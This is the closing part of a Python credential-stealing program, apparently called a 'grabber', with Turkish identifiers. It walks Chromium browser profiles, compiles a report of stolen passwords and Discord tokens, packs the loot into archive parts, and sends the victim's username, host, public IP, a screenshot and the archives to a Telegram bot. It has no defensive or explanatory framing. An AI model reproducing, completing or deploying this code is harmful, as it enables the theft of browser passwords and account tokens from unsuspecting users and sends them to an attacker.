    for name, (root, rel) in CHROMIUM.items():
        try: chromium(name, root, rel)
        except Exception as e: print("[-] %s: %s" % (name, e))

    write("ozet.json", json.dumps(REPORT, ensure_ascii=False, indent=2))
    parts, total = pack()
    print("[+] %d parca, %.2f MB" % (len(parts), total / 1048576))

    if a.no_telegram or not TG_TOKEN:
        for p in parts: print("   ", p)
        return

    s = REPORT.get("system", {})
    tg_text("<b>grabber</b>\n<code>%s\\%s</code>\n%s\nIP: %s\n\nsifre: <b>%s</b> | token: <b>%s</b>\nparca: %d | %.2f MB" % (
        s.get("domain", ""), s.get("kullanici", "?"), s.get("os", "").replace("Caption=", ""),
        s.get("public_ip", "-"), REPORT.get("sifre", 0), REPORT.get("discord_token", 0),
        len(parts), total / 1048576))
    if shot: tg_photo(shot, "%s@%s" % (os.environ.get("USERNAME"), socket.gethostname()))
    for i, p in enumerate(parts, 1):
        tg_doc(p, "parca %d/%d — %.2f MB" % (i, len(parts), os.path.getsize(p) / 1048576))
    print("[+] Bitti")

if __name__ == "__main__":
    main()